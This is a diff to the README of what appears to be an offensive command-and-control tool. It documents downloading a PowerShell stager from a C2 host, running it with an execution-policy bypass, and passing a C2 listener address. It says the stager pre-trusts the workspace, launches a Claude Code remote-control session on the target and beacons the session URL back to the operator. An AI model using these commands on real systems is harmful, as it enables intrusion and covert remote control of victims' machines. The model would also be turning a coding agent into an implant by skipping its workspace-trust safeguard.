@@ -122,16 +122,25 @@ If the operator console is running with `--serve-dir`, the target can pull the s
 
 ```powershell
 Invoke-WebRequest -Uri http://<c2-host>:9050/serve/<implant-id>/rc_stager_full.ps1 -OutFile C:\temp\stager.ps1
-powershell -ExecutionPolicy Bypass -File C:\temp\stager.ps1
+powershell -ExecutionPolicy Bypass -File C:\temp\stager.ps1 -C2 <c2-ip>:9090
 ```
 
 Or copy it manually and run:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1
+powershell -ExecutionPolicy Bypass -File rc_stager_full.ps1 -C2 <c2-ip>:9090
 ```
 
-The stager launches a Claude Code remote-control session and beacons the session URL back to the operator's TCP listener.
+**Parameters:**
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `-C2` | Yes | C2 listener address as `host:port` (e.g. `10.0.1.4:9090`) |
+| `-Name` | No | Session name shown in claude.ai/code |
+| `-StagingDir` | No | Custom staging directory (default: `$env:TEMP\cc-<random>`) |
+| `-Verbose` | No | Show detailed progress output |
+
+The stager pre-trusts the workspace, launches a Claude Code remote-control session, and beacons the bridge URL back to the operator's TCP listener.
 
 ### 4. Decrypt results
 
